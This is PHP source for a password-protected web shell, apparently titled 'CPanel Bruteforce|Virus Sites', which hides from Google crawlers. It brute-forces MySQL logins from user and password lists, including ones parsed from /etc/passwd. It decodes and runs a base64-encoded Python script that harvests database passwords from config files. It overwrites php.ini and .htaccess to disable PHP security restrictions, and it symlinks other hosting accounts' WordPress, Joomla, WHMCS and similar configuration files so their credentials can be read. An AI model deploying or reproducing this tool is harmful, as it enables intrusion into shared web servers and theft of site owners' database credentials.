<?php
$auth_pass = "211455c1c6bf5f0b92326e818d6597f1";
$color = "#00ff00";
$default_action = 'FilesMan';
@define('SELF_PATH', __FILE__);
if( strpos($_SERVER['HTTP_USER_AGENT'],'Google') !== false ) {
    header('HTTP/1.0 404 Not Found');
    exit;
}
@session_start();
@error_reporting(0);
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@set_time_limit(0);
@set_magic_quotes_runtime(0);
@define('VERSION', '2.1');
if( get_magic_quotes_gpc() ) {
    function stripslashes_array($array) {
        return is_array($array) ? array_map('stripslashes_array', $array) : stripslashes($array);
    }
    $_POST = stripslashes_array($_POST);
}
function printLogin() {
    ?>

<head>
<style type="text/css">
<!--
body {
	background-color: #000000;
	font-family: Verdana;
    font-size: 13px;
	color: #e1e1e1;
	margin:5px;
}
input,textarea,select{
color: #00FF00;
font-size: 13px;
border: 1px solid #00FF00;
background-color: #080808;
}
input:hover,textarea:hover,select:hover{
color: #00FF00;
font-size: 13px;
border: 1px solid #00FF00;
background-color: #080808;
}
a {
	background-color: #000000;
	vertical-align: bottom;
	text-decoration: none;
	font-size: 13px;
	color:#00FF00;
}
a:hover {
	background-color: #080808;
	vertical-align: bottom;
	text-decoration: none;
	font-size: 13px;
	color:#00FF00;
}
.label {
	font-size: 13px;
	color: #e1e1e1;
	padding:3px;
}
td {
border-bottom:2px solid #222222;
background:#222;
}
input#s{
position:relative;
width:150px;
height:20px;
border:0;
vertical-align:bottom;
background:url(images/input-search-bkg.png) 0 0 no-repeat;
}
-->

</style>
</head>
       				
    <table width="550" cellpadding="3" cellspacing="1" align="center" style="border:3px solid #00FF00;" border=1>
    <tr>
        <td valign="top" colspan="6" style="border-bottom:2px solid #00FF00;padding:10px;"><center><span style="font-family: Verdana;font-size:30px;font-weight:bold;text-shadow: #00FF00 0.0em 0.0em 0.2em;">CPanel Bruteforce|Virus Sites</span><br>
		</center></td>
    </tr>
    <tr>
    <td valign="top" style="width: 200px;"><span class="label">Safe Mode</span></td>
    <td valign="top" colspan="5"><span class="label">
	
	</span>
	</td>
    </tr>
    <tr>
    <td valign="top"><span class="label">Disable Function</span></td>
    <td valign="top" colspan="5">

<input name="matikan" type="hidden" value="sekatan">        				
<font color='#00FF00' style='position:absolute;font-size:13px;'>No Security for Function</font><tr><td valign="top"><span class="label">Bypass</span></td><td valign="top" colspan="5"><font color="#00FF00" style="font-size:13px;">Success</font></td></tr></form></td>

<input name="mendapatkan" type="hidden" value="passwd">        				
    <tr>
    <td valign="top"><span class="label">Get Config</span></td>
    <script>
function show_alert()
{
   alert("You Must Loggin ^_^");
}
</script>
      
    <td valign="top" colspan="6"><input type="submit" value="Submit" onclick="show_alert();"></td>
    </td>
    </tr>


<input name="1" type="hidden" value="password">        				
    <tr>
    <td valign="top"><span class="label">Get Passlist</span></td>
    <script>
function show_alert()
{
   alert("You Must Loggin ^_^");
}
</script>
      
    <td valign="top" colspan="6"><input type="submit" value="Submit" onclick="show_alert();"></td>
    </td>
    </tr>

    <tr>
    <td valign="top">
	<span class="label">Userlist</span></td>
    <td valign="top" colspan="5"><textarea cols="40" rows="7" name="usernames">
</textarea></td>
    </tr>
    <tr>
    <td valign="top">
	<span class="label">Passlist</span></td>
    <td valign="top"colspan="5"><textarea cols="40" rows="7" name="passwords"></textarea></td>
    </tr>
    <tr>
    <td valign="top">
	<span class="label">Type</span></td>
    <td valign="top" colspan="5">
	<input type="radio" name="type" value="simple" checked="checked"><span class="label">Simple</span>
	<input type="radio" name="type" value="passwd"><span class="label">/etc/passwd</span>
    </td>
    </tr>
    <tr>
	<script>
function show_alert()
{
   alert("You Must Loggin ^_^");
}
</script>
      
    <td valign="top" colspan="6"><center><input type="submit" value="Submit" onclick="show_alert();"></center></td>
    </tr>

<tr>
<td valign="top" colspan="6" style="border-top:2px solid #00FF00;"><center><font face="Verdana" color="#e1e1e1" size="2" style="margin:7px;">Allright Reserved &copy; Virus Sites</font></center></td>
</tr>
</table>

 <form method=post>
	
    <input  id="s" type=password name=pass 'border:0;'>
    </form></center>
    <?php
    exit;
}
if( !isset( $_SESSION[md5($_SERVER['HTTP_HOST'])] ))
    if( empty( $auth_pass ) ||
        ( isset( $_POST['pass'] ) && ( md5($_POST['pass']) == $auth_pass ) ) )
        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
    else
        printLogin();
@set_time_limit(0);
@error_reporting(0);
$login_time = 3600 * 24 * 7;
$hijau = array("#00FF00", "#006400", "#888888");
$merah = array("#FF0000", "#640000", "#888888");
$biru = array("#0000FF", "#000064", "#888888");
$kuning = array("#FFFF00", "#646400", "#888888");
$cyan = array("#00FFFF", "#006464", "#888888");
$pink = array("#FF00FF", "#640064", "#888888");
$theme = "hijau";
if(isset($_COOKIE['theme'])) $theme = $_COOKIE['theme'];
switch(isset($_GET['x'])){
case 'green':
if(isset($_COOKIE['theme'])) $theme = $_COOKIE['theme'];
$theme = "hijau";
setcookie("theme", $theme ,time() + $login_time);
break;
case 'red':
if(isset($_COOKIE['theme'])) $theme = $_COOKIE['theme'];
$theme = "merah";
setcookie("theme", $theme ,time() + $login_time);
break;
case 'blue':
if(isset($_COOKIE['theme'])) $theme = $_COOKIE['theme'];
$theme = "biru";
setcookie("theme", $theme ,time() + $login_time);
break;
case 'yellow':
if(isset($_COOKIE['theme'])) $theme = $_COOKIE['theme'];
$theme = "kuning";
setcookie("theme", $theme ,time() + $login_time);
break;
case 'cyan':
if(isset($_COOKIE['theme'])) $theme = $_COOKIE['theme'];
$theme = "cyan";
setcookie("theme", $theme ,time() + $login_time);
break;
case 'pink':
if(isset($_COOKIE['theme'])) $theme = $_COOKIE['theme'];
$theme = "pink";
setcookie("theme", $theme ,time() + $login_time);
break;
}
if($theme == "hijau")
{$color = $hijau;}
elseif($theme == "merah")
{$color = $merah;}
elseif($theme == "biru")
{$color = $biru;}
elseif($theme == "kuning")
{$color = $kuning;}
elseif($theme == "cyan")
{$color = $cyan;}
else
{$color = $pink;}
echo '<head>
<style type="text/css">
<!--
body {
	background-color: #000000;
	font-family: Verdana;
    font-size: 13px;
	color: #e1e1e1;
	margin:5px;
}
input,textarea,select{
color: '.$color[0].';
font-size: 13px;
border: 1px solid '.$color[0].';
background-color: #080808;
}
input:hover,textarea:hover,select:hover{
color: '.$color[0].';
font-size: 13px;
border: 1px solid '.$color[0].';
background-color: #080808;
}
a {
	background-color: #000000;
	vertical-align: bottom;
	text-decoration: none;
	font-size: 13px;
	color:'.$color[0].';
}
a:hover {
	background-color: #080808;
	vertical-align: bottom;
	text-decoration: none;
	font-size: 13px;
	color:'.$color[0].';
}
.label {
	font-size: 13px;
	color: #e1e1e1;
	padding:3px;
}
td {
border-bottom:2px solid #222222;
background:#222;
}
-->
</style>
</head>
';
if(isset($_POST['page']) == 'find')
{
if(isset($_POST['usernames']) && isset($_POST['passwords']))
{
    if($_POST['type'] == 'passwd'){
        $e = explode("\n",$_POST['usernames']);
        foreach($e as $value){
        $k = explode(":",$value);
        $username .= $k['0']." ";
        }
    }elseif($_POST['type'] == 'simple'){
        $username = str_replace("\n",' ',$_POST['usernames']);
    }
    $a1 = explode(" ",$username);
    $a2 = explode("\n",$_POST['passwords']);
    $id2 = count($a2);
    $ok = 0;
    foreach($a1 as $user )
    {
        if($user !== '')
        {
        $user=trim($user);
         for($i=0;$i<=$id2;$i++)
         {
            $pass = trim($a2[$i]);
            if(@mysql_connect('localhost',$user,$pass))
            {
                echo "S4MP4H ~ User : (<font color='".$color[0]."'>$user</font>) Pass : (<font color='".$color[0]."'>$pass</font>)<br />";
                $ok++;
            }
         }
        }
    }
    echo "<body style='background:#000000;color:#ffffff;font-size:17px;font-family:Tahoma,Verdana,Arial;'><hr noshade size=1>";
    echo "<center>[Done] : <font color='".$color[0]."'>You Found</font> $ok <font color='".$color[0]."'>CPanel,</font> <a href=".$_SERVER['PHP_SELF']." style='text-decoration:none;'><input type='button' value='Back !'></a></center></body>";
    exit;
}
}
if(isset($_POST['pass1']) == 'password'){
error_reporting(0);
mkdir('config',0755);
$cp =
'IyEvdXNyL2Jpbi9lbnYgcHl0aG9uDQoNCicnJw0KQnk6IEFobWVkIFNoYXdreSBha2EgbG54ZzMzaw0KdGh4OiBPYnp5LCBSZWxpaywgbW9oYWIgYW5kICNhcmFicHduIA0KJycnDQoNCmltcG9ydCBzeXMNCmltcG9ydCBvcw0KaW1wb3J0IHJlDQppbXBvcnQgc3VicHJvY2Vzcw0KaW1wb3J0IHVybGxpYg0KaW1wb3J0IGdsb2INCmZyb20gcGxhdGZvcm0gaW1wb3J0IHN5c3RlbQ0KDQppZiBsZW4oc3lzLmFyZ3YpICE9IDM6DQogIHByaW50JycnCQ0KIFVzYWdlOiAlcyBbVVJMLi4uXSBbZGlyZWN0b3J5Li4uXQ0KIEV4KSAlcyBodHRwOi8vd3d3LnRlc3QuY29tL3Rlc3QvIFtkaXIgLi4uXScnJyAlIChzeXMuYXJndlswXSwgc3lzLmFyZ3ZbMF0pDQogIHN5cy5leGl0KDEpDQoNCnNpdGUgPSBzeXMuYXJndlsxXQ0KZm91dCA9IHN5cy5hcmd2WzJdDQoNCnRyeToNCiAgcmVxICA9IHVybGxpYi51cmxvcGVuKHNpdGUpDQogIHJlYWQgPSByZXEucmVhZCgpDQogIGlmIHN5c3RlbSgpID09ICdMaW51eCc6DQogICAgZiA9IG9wZW4oJy90bXAvZGF0YS50eHQnLCAndycpDQogICAgZi53cml0ZShyZWFkKQ0KICAgIGYuY2xvc2UoKQ0KICBpZiBzeXN0ZW0oKSA9PSAnV2luZG93cyc6DQogICAgZiA9IG9wZW4oJ2RhdGEudHh0JywgJ3cnKSAgDQogICAgZi53cml0ZShyZWFkKQ0KICAgIGYuY2xvc2UoKQ0KDQogIGkgPSAwDQogIGlmIHN5c3RlbSgpID09ICdMaW51eCc6DQogICAgZiA9IG9wZW4oJy90bXAvZGF0YS50eHQnLCAnclUnKQ0KICAgIGZvciBsaW5lIGluIGY6DQogICAgICBpZiBsaW5lLnN0YXJ0c3dpdGgoJzxsaT48YScpID09IFRydWUgOg0KICAgICAgICBtID0gcmUuc2VhcmNoKHInKDxhIGhyZWY9IikoLitbXj5dKSgiPiknLCBsaW5lKQ0KICAgICAgICBpICs9IDENCiAgICAgICAgbG9jYWxfbmFtZSA9ICclcy9maWxlJWQudHh0JyAlIChmb3V0LCBpKQ0KICAgICAgICBwcmludCAnUmV0cmlldmluZy4uLlx0XHQnLCBzaXRlICsgbS5ncm91cCgyKQ0KICAgICAgICB0cnk6ICB1cmxsaWIudXJscmV0cmlldmUoc2l0ZSArIG0uZ3JvdXAoMiksIGxvY2FsX25hbWUpDQogICAgICAgIGV4Y2VwdCBJT0Vycm9yOg0KICAgICAgICAgIHByaW50ICdcblslc10gZG9lc25cJ3QgZXhpc3QsIGNyZWF0ZSBpdCBmaXJzdCcgJSBmb3V0DQogICAgICAgICAgc3lzLmV4aXQoKQ0KICAgICAgaWYgbGluZS5zdGFydHN3aXRoKCc8aW1nJykgPT0gVHJ1ZToNCiAgICAgICAgbTEgPSByZS5zZWFyY2gocicoPGEgaHJlZj0iKSguK1tePl0pKCI+KScsIGxpbmUpDQogICAgICAgIGkgKz0gMQ0KICAgICAgICBsb2NhbF9uYW1lID0gJyVzL2ZpbGUlZC50eHQnICUgKGZvdXQsIGkpDQogICAgICAgIHByaW50ICdSZXRyaWV2aW5nLi4uXHRcdCcsIHNpdGUgKyBtMS5ncm91cCgyKQ0KICAgICAgICB0cnk6ICB1cmxsaWIudXJscmV0cmlldmUoc2l0ZSArIG0xLmdyb3VwKDIpLCBsb2NhbF9uYW1lKQ0KICAgICAgICBleGNlcHQgSU9FcnJvcjoNCiAgICAgICAgICBwcmludCAnXG5bJXNdIGRvZXNuXCd0IGV4aXN0LCBjcmVhdGUgaXQgZmlyc3QnICUgZm91dA0KICAgICAgICAgIHN5cy5leGl0KCkNCiAgICAgIGlmIGxpbmUuc3RhcnRzd2l0aCgnPElNRycpID09IFRydWU6DQogICAgICAgIG0yID0gcmUuc2VhcmNoKHInKDxBIEhSRUY9IikoLitbXj5dKSgiPiknLCBsaW5lKQ0KICAgICAgICBpICs9IDENCiAgICAgICAgbG9jYWxfbmFtZSA9ICclcy9maWxlJWQudHh0JyAlIChmb3V0LCBpKQ0KICAgICAgICBwcmludCAnUmV0cmlldmluZy4uLlx0XHQnLCBzaXRlICsgbTIuZ3JvdXAoMikNCiAgICAgICAgdHJ5OiAgdXJsbGliLnVybHJldHJpZXZlKHNpdGUgKyBtMi5ncm91cCgyKSwgbG9jYWxfbmFtZSkNCiAgICAgICAgZXhjZXB0IElPRXJyb3I6DQogICAgICAgICAgcHJpbnQgJ1xuWyVzXSBkb2VzblwndCBleGlzdCwgY3JlYXRlIGl0IGZpcnN0JyAlIGZvdXQNCiAgICAgICAgICBzeXMuZXhpdCgpDQogICAgZi5jbG9zZSgpDQogIGlmIHN5c3RlbSgpID09ICdXaW5kb3dzJzoNCiAgICBmID0gb3BlbignZGF0YS50eHQnLCAnclUnKQ0KICAgIGZvciBsaW5lIGluIGY6DQogICAgICBpZiBsaW5lLnN0YXJ0c3dpdGgoJzxsaT48YScpID09IFRydWUgOg0KICAgICAgICBtID0gcmUuc2VhcmNoKHInKDxhIGhyZWY9IikoLitbXj5dKSgiPiknLCBsaW5lKQ0KICAgICAgICBpICs9IDENCiAgICAgICAgbG9jYWxfbmFtZSA9ICclcy9maWxlJWQudHh0JyAlIChmb3V0LCBpKQ0KICAgICAgICBwcmludCAnUmV0cmlldmluZy4uLlx0XHQnLCBzaXRlICsgbS5ncm91cCgyKQ0KICAgICAgICB0cnk6ICB1cmxsaWIudXJscmV0cmlldmUoc2l0ZSArIG0uZ3JvdXAoMiksIGxvY2FsX25hbWUpDQogICAgICAgIGV4Y2VwdCBJT0Vycm9yOg0KICAgICAgICAgIHByaW50ICdcblslc10gZG9lc25cJ3QgZXhpc3QsIGNyZWF0ZSBpdCBmaXJzdCcgJSBmb3V0DQogICAgICAgICAgc3lzLmV4aXQoKQ0KICAgICAgaWYgbGluZS5zdGFydHN3aXRoKCc8aW1nJykgPT0gVHJ1ZToNCiAgICAgICAgbTEgPSByZS5zZWFyY2gocicoPGEgaHJlZj0iKSguK1tePl0pKCI+KScsIGxpbmUpDQogICAgICAgIGkgKz0gMQ0KICAgICAgICBsb2NhbF9uYW1lID0gJyVzL2ZpbGUlZC50eHQnICUgKGZvdXQsIGkpDQogICAgICAgIHByaW50ICdSZXRyaWV2aW5nLi4uXHRcdCcsIHNpdGUgKyBtMS5ncm91cCgyKQ0KICAgICAgICB0cnk6ICB1cmxsaWIudXJscmV0cmlldmUoc2l0ZSArIG0xLmdyb3VwKDIpLCBsb2NhbF9uYW1lKQ0KICAgICAgICBleGNlcHQgSU9FcnJvcjoNCiAgICAgICAgICBwcmludCAnXG5bJXNdIGRvZXNuXCd0IGV4aXN0LCBjcmVhdGUgaXQgZmlyc3QnICUgZm91dA0KICAgICAgICAgIHN5cy5leGl0KCkNCiAgICAgIGlmIGxpbmUuc3RhcnRzd2l0aCgnPElNRycpID09IFRydWU6DQogICAgICAgIG0yID0gcmUuc2VhcmNoKHInKDxBIEhSRUY9IikoLitbXj5dKSgiPiknLCBsaW5lKQ0KICAgICAgICBpICs9IDENCiAgICAgICAgbG9jYWxfbmFtZSA9ICclcy9maWxlJWQudHh0JyAlIChmb3V0LCBpKQ0KICAgICAgICBwcmludCAnUmV0cmlldmluZy4uLlx0XHQnLCBzaXRlICsgbTIuZ3JvdXAoMikNCiAgICAgICAgdHJ5OiAgdXJsbGliLnVybHJldHJpZXZlKHNpdGUgKyBtMi5ncm91cCgyKSwgbG9jYWxfbmFtZSkNCiAgICAgICAgZXhjZXB0IElPRXJyb3I6DQogICAgICAgICAgcHJpbnQgJ1xuWyVzXSBkb2VzblwndCBleGlzdCwgY3JlYXRlIGl0IGZpcnN0JyAlIGZvdXQNCiAgICAgICAgICBzeXMuZXhpdCgpDQogICAgZi5jbG9zZSgpDQogIGlmIHN5c3RlbSgpID09ICdMaW51eCc6DQogICAgY2xlYW51cCA9IHN1YnByb2Nlc3MuUG9wZW4oJ3JtIC1yZiAvdG1wL2RhdGEudHh0ID4gL2Rldi9udWxsJywgc2hlbGw9VHJ1ZSkud2FpdCgpDQogIGlmIHN5c3RlbSgpID09ICdXaW5kb3dzJzoNCiAgICBjbGVhbnVwID0gc3VicHJvY2Vzcy5Qb3BlbignZGVsIEM6XGRhdGEudHh0Jywgc2hlbGw9VHJ1ZSkud2FpdCgpDQogIHByaW50ICdcbicsICctJyAqIDEwMCwgJ1xuJw0KICBpZiBzeXN0ZW0oKSA9PSAnTGludXgnOg0KICAgIGZvciByb290LCBkaXJzLCBmaWxlcyBpbiBvcy53YWxrKGZvdXQpOg0KICAgICAgZm9yIGZuYW1lIGluIGZpbGVzOg0KICAgICAgICBmdWxscGF0aCA9IG9zLnBhdGguam9pbihyb290LCBmbmFtZSkNCiAgICAgICAgZiA9IG9wZW4oZnVsbHBhdGgsICdyJykNCiAgICAgICAgZm9yIGxpbmUgaW4gZjoNCiAgICAgICAgICBzZWNyID0gcmUuc2VhcmNoIChyIihkYl9wYXNzd29yZCddID0gJykoLitbXj5dKSgnOykiLCBsaW5lKQ0KICAgICAgICAgIGlmIHNlY3IgaXMgbm90IE5vbmU6IHByaW50IChzZWNyLmdyb3VwKDIpKSAgDQogICAgICAgICAgc2VjcjEgPSByZS5zZWFyY2gociIocGFzc3dvcmQgPSAnKSguK1tePl0pKCc7KSIsIGxpbmUpDQogICAgICAgICAgaWYgc2VjcjEgaXMgbm90IE5vbmU6ICBwcmludCAgKHNlY3IxLmdyb3VwKDIpKQ0KICAgICAgICAgIHNlY3IyID0gcmUuc2VhcmNoKHIiKERCX1BBU1NXT1JEJykoLi4uKSguK1tePl0pKCcpIiwgbGluZSkNCiAgICAgICAgICBpZiBzZWNyMiBpcyBub3QgTm9uZTogcHJpbnQgKHNlY3IyLmdyb3VwKDMpKQ0KICAgICAgICAgIHNlY3IzID0gcmUuc2VhcmNoIChyIihkYnBhc3MgPS4uKSguK1tePl0pKC47KSIsIGxpbmUpDQogICAgICAgICAgaWYgc2VjcjMgaXMgbm90IE5vbmU6IHByaW50IChzZWNyMy5ncm91cCgyKSkNCiAgICAgICAgICBzZWNyNCA9IHJlLnNlYXJjaCAociIoREJQQVNTV09SRCA9ICcpKC4rW14+XSkoLjspIiwgbGluZSkNCiAgICAgICAgICBpZiBzZWNyNCBpcyBub3QgTm9uZTogcHJpbnQgKHNlY3I0Lmdyb3VwKDIpKQ0KICAgICAgICAgIHNlY3I1ID0gcmUuc2VhcmNoIChyIihEQnBhc3MgPSAnKSguK1tePl0pKCc7KSIsIGxpbmUpDQogICAgICAgICAgaWYgc2VjcjUgaXMgbm90IE5vbmU6IHByaW50IChzZWNyNS5ncm91cCgyKSkNCiAgICAgICAgICBzZWNyNiA9IHJlLnNlYXJjaCAociIoZGJwYXNzd2QgPSAnKSguK1tePl0pKCc7KSIsIGxpbmUpDQogICAgICAgICAgaWYgc2VjcjYgaXMgbm90IE5vbmU6IHByaW50IChzZWNyNi5ncm91cCgyKSkNCiAgICAgICAgICBzZWNyNyA9IHJlLnNlYXJjaCAociIobW9zQ29uZmlnX3Bhc3N3b3JkID0gJykoLitbXj5dKSgnOykiLCBsaW5lKQ0KICAgICAgICAgIGlmIHNlY3I3IGlzIG5vdCBOb25lOiBwcmludCAoc2VjcjcuZ3JvdXAoMikpDQogICAgICAgIGYuY2xvc2UoKQ0KICBpZiBzeXN0ZW0oKSA9PSAnV2luZG93cyc6DQogICAgZm9yIGluZmlsZSBpbiBnbG9iLmdsb2IoIG9zLnBhdGguam9pbihmb3V0LCAnKi50eHQnKSApOg0KICAgICAgZiA9IG9wZW4oaW5maWxlLCAncicpDQogICAgICBmb3IgbGluZSBpbiBmOg0KICAgICAgICBzZWNyID0gcmUuc2VhcmNoIChyIihkYl9wYXNzd29yZCddID0gJykoLitbXj5dKSgnOykiLCBsaW5lKQ0KICAgICAgICBpZiBzZWNyIGlzIG5vdCBOb25lOiBwcmludCAoc2Vjci5ncm91cCgyKSkgIA0KICAgICAgICBzZWNyMSA9IHJlLnNlYXJjaChyIihwYXNzd29yZCA9ICcpKC4rW14+XSkoJzspIiwgbGluZSkNCiAgICAgICAgaWYgc2VjcjEgaXMgbm90IE5vbmU6ICBwcmludCAgKHNlY3IxLmdyb3VwKDIpKQ0KICAgICAgICBzZWNyMiA9IHJlLnNlYXJjaChyIihEQl9QQVNTV09SRCcpKC4uLikoLitbXj5dKSgnKSIsIGxpbmUpDQogICAgICAgIGlmIHNlY3IyIGlzIG5vdCBOb25lOiBwcmludCAoc2VjcjIuZ3JvdXAoMykpDQogICAgICAgIHNlY3IzID0gcmUuc2VhcmNoIChyIihkYnBhc3MgPS4uKSguK1tePl0pKC47KSIsIGxpbmUpDQogICAgICAgIGlmIHNlY3IzIGlzIG5vdCBOb25lOiBwcmludCAoc2VjcjMuZ3JvdXAoMikpDQogICAgICAgIHNlY3I0ID0gcmUuc2VhcmNoIChyIihEQlBBU1NXT1JEID0gJykoLitbXj5dKSguOykiLCBsaW5lKQ0KICAgICAgICBpZiBzZWNyNCBpcyBub3QgTm9uZTogcHJpbnQgKHNlY3I0Lmdyb3VwKDIpKQ0KICAgICAgICBzZWNyNSA9IHJlLnNlYXJjaCAociIoREJwYXNzID0gJykoLitbXj5dKSgnOykiLCBsaW5lKQ0KICAgICAgICBpZiBzZWNyNSBpcyBub3QgTm9uZTogcHJpbnQgKHNlY3I1Lmdyb3VwKDIpKQ0KICAgICAgICBzZWNyNiA9IHJlLnNlYXJjaCAociIoZGJwYXNzd2QgPSAnKSguK1tePl0pKCc7KSIsIGxpbmUpDQogICAgICAgIGlmIHNlY3I2IGlzIG5vdCBOb25lOiBwcmludCAoc2VjcjYuZ3JvdXAoMikpDQogICAgICAgIHNlY3I3ID0gcmUuc2VhcmNoIChyIihtb3NDb25maWdfcGFzc3dvcmQgPSAnKSguK1tePl0pKCc7KSIsIGxpbmUpDQogICAgICAgIGlmIHNlY3I3IGlzIG5vdCBOb25lOiBwcmludCAoc2VjcjcuZ3JvdXAoMikpDQogICAgICBmLmNsb3NlKCkNCmV4Y2VwdCAoS2V5Ym9hcmRJbnRlcnJ1cHQpOg0KICBwcmludCAnXG5UaGFua3MgZm9yIHVzaW5nIGl0IC5fXic=';
$file = fopen("cp.py","w+");
$write = fwrite ($file ,base64_decode($cp));
fclose($file);
chmod("cp.py",0755);
$url = $_POST['url'];
echo"<center>
<textarea cols=\"90\" rows=\"20\" name=\"usernames\">";
system("python cp.py $url config");
unlink ('cp.py');
echo"</textarea>
</center>";
echo "<body style='background:#000000;color:#ffffff;font-size:17px;font-family:Tahoma,Verdana,Arial;'><br/><center>[Done] : <span style='color:".$color[0].";'>Successfull, </span> <a href=".$_SERVER['PHP_SELF']." style='text-decoration:none;'><input type='button' value='Back !'></a></center></body>";
exit;
}
if(isset($_POST['matikan']) =='sekatan'){
@error_reporting(0);
$phpini =
'c2FmZV9tb2RlPU9GRg0KZGlzYWJsZV9mdW5jdGlvbnM9Tk9ORQ==';
$file = fopen("php.ini","w+");
$write = fwrite ($file ,base64_decode($phpini));
fclose($file);
$htaccess =
'T3B0aW9ucyBGb2xsb3dTeW1MaW5rcyBNdWx0aVZpZXdzIEluZGV4ZXMgRXhlY0NHSQ==';
$file = fopen(".htaccess","w+");
$write = fwrite ($file ,base64_decode($htaccess));
echo "<body style='background:#000000;color:#ffffff;font-size:17px;font-family:Tahoma,Verdana,Arial;'><br/><center>[Done] : <span style='color:".$color[0].";'>Successfull, </span> <a href=".$_SERVER['PHP_SELF']." style='text-decoration:none;'><input type='button' value='Back !'></a></center></body>";
exit;
}
if(isset($_POST['mendapatkan']) == 'passwd'){
@set_magic_quotes_runtime(0);
ob_start();
error_reporting(0);
@set_time_limit(0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0);
$fn = $_POST['foldername'];
function syml($usern,$pdomain)
	{
		symlink('/home/'.$usern.'/public_html/inc/config.php',$pdomain.'~~MyBB.txt');
		symlink('/home/'.$usern.'/public_html/sites/default/settings.php',$pdomain.'~~Drupal.txt');
		symlink('/home/'.$usern.'/public_html/includes/configure.php',$pdomain.'~~Oscommerce.txt');
		symlink('/home/'.$usern.'/public_html/lib/config.php',$pdomain.'~~Balitbang.txt');
		symlink('/home/'.$usern.'/public_html/config/koneksi.php',$pdomain.'~~Lokomedia.txt');
		symlink('/home/'.$usern.'/public_html/vb/includes/config.php',$pdomain.'~~vBulletin1.txt');
		symlink('/home/'.$usern.'/public_html/includes/config.php',$pdomain.'~~vBulletin2.txt');
		symlink('/home/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~vBulletin3.txt');
		symlink('/home/'.$usern.'/public_html/cc/includes/config.php',$pdomain.'~~vBulletin4.txt');
		symlink('/home/'.$usern.'/public_html/config.php',$pdomain.'~~Phpbb1.txt');
		symlink('/home/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~Phpbb2.txt');
		symlink('/home/'.$usern.'/public_html/wp-config.php',$pdomain.'~~Wordpress1.txt');
		symlink('/home/'.$usern.'/public_html/blog/wp-config.php',$pdomain.'~~Wordpress2.txt');
		symlink('/home/'.$usern.'/public_html/wp/wp-config.php',$pdomain.'~~Wordpress3.txt');
		symlink('/home/'.$usern.'/public_html/home/wp-config.php',$pdomain.'~~Wordpress4.txt');
		symlink('/home/'.$usern.'/public_html/main/wp-config.php',$pdomain.'~~Wordpress5.txt');
		symlink('/home/'.$usern.'/public_html/site/wp-config.php',$pdomain.'~~Wordpress6.txt');
		symlink('/home/'.$usern.'/public_html/configuration.php',$pdomain.'~~Joomla1.txt');
		symlink('/home/'.$usern.'/public_html/blog/configuration.php',$pdomain.'~~Joomla2.txt');
		symlink('/home/'.$usern.'/public_html/joomla/configuration.php',$pdomain.'~~Joomla3.txt');
		symlink('/home/'.$usern.'/public_html/main/configuration.php',$pdomain.'~~Joomla4.txt');
		symlink('/home/'.$usern.'/public_html/home/configuration.php',$pdomain.'~~Joomla5.txt');
		symlink('/home/'.$usern.'/public_html/site/configuration.php',$pdomain.'~~Joomla6.txt');
		symlink('/home/'.$usern.'/public_html/whm/configuration.php',$pdomain.'~~Whm1.txt');
		symlink('/home/'.$usern.'/public_html/whmc/configuration.php',$pdomain.'~~Whm2.txt');
		symlink('/home/'.$usern.'/public_html/support/configuration.php',$pdomain.'~~Whm3.txt');
		symlink('/home/'.$usern.'/public_html/client/configuration.php',$pdomain.'~~Whm4.txt');
		symlink('/home/'.$usern.'/public_html/billings/configuration.php',$pdomain.'~~Whm5.txt');
		symlink('/home/'.$usern.'/public_html/billing/configuration.php',$pdomain.'~~Whm6.txt');
		symlink('/home/'.$usern.'/public_html/clients/configuration.php',$pdomain.'~~Whm7.txt');
		symlink('/home/'.$usern.'/public_html/whmcs/configuration.php',$pdomain.'~~Whm8.txt');
		symlink('/home/'.$usern.'/public_html/order/configuration.php',$pdomain.'~~Whm9.txt');
		symlink('/home/'.$usern.'/public_html/admin/conf.php',$pdomain.'~~Other1.txt');
		symlink('/home/'.$usern.'/public_html/admin/config.php',$pdomain.'~~Other2.txt');
		symlink('/home/'.$usern.'/public_html/conf_global.php',$pdomain.'~~invisio.txt');
		symlink('/home/'.$usern.'/public_html/include/db.php',$pdomain.'~~Other3.txt');
		symlink('/home/'.$usern.'/public_html/connect.php',$pdomain.'~~Other4.txt');
		symlink('/home/'.$usern.'/public_html/mk_conf.php',$pdomain.'~~mk-portale1.txt');
		symlink('/home/'.$usern.'/public_html/include/config.php',$pdomain.'~~Other5.txt');
		symlink('/home/'.$usern.'/public_html/settings.php',$pdomain.'~~Smf.txt');
		symlink('/home/'.$usern.'/public_html/includes/functions.php',$pdomain.'~~phpbb3.txt');
		symlink('/home/'.$usern.'/public_html/include/db.php',$pdomain.'~~infinity.txt');
		symlink('/home2/'.$usern.'/public_html/inc/config.php',$pdomain.'~~MyBB.txt');
		symlink('/home2/'.$usern.'/public_html/sites/default/settings.php',$pdomain.'~~Drupal.txt');
		symlink('/home2/'.$usern.'/public_html/includes/configure.php',$pdomain.'~~Oscommerce.txt');
		symlink('/home2/'.$usern.'/public_html/lib/config.php',$pdomain.'~~Balitbang.txt');
		symlink('/home2/'.$usern.'/public_html/config/koneksi.php',$pdomain.'~~Lokomedia.txt');
		symlink('/home2/'.$usern.'/public_html/vb/includes/config.php',$pdomain.'~~vBulletin1.txt');
		symlink('/home2/'.$usern.'/public_html/includes/config.php',$pdomain.'~~vBulletin2.txt');
		symlink('/home2/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~vBulletin3.txt');
		symlink('/home2/'.$usern.'/public_html/cc/includes/config.php',$pdomain.'~~vBulletin4.txt');
		symlink('/home2/'.$usern.'/public_html/config.php',$pdomain.'~~Phpbb1.txt');
		symlink('/home2/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~Phpbb2.txt');
		symlink('/home2/'.$usern.'/public_html/wp-config.php',$pdomain.'~~Wordpress1.txt');
		symlink('/home2/'.$usern.'/public_html/blog/wp-config.php',$pdomain.'~~Wordpress2.txt');
		symlink('/home2/'.$usern.'/public_html/wp/wp-config.php',$pdomain.'~~Wordpress3.txt');
		symlink('/home2/'.$usern.'/public_html/home/wp-config.php',$pdomain.'~~Wordpress4.txt');
		symlink('/home2/'.$usern.'/public_html/main/wp-config.php',$pdomain.'~~Wordpress5.txt');
		symlink('/home2/'.$usern.'/public_html/site/wp-config.php',$pdomain.'~~Wordpress6.txt');
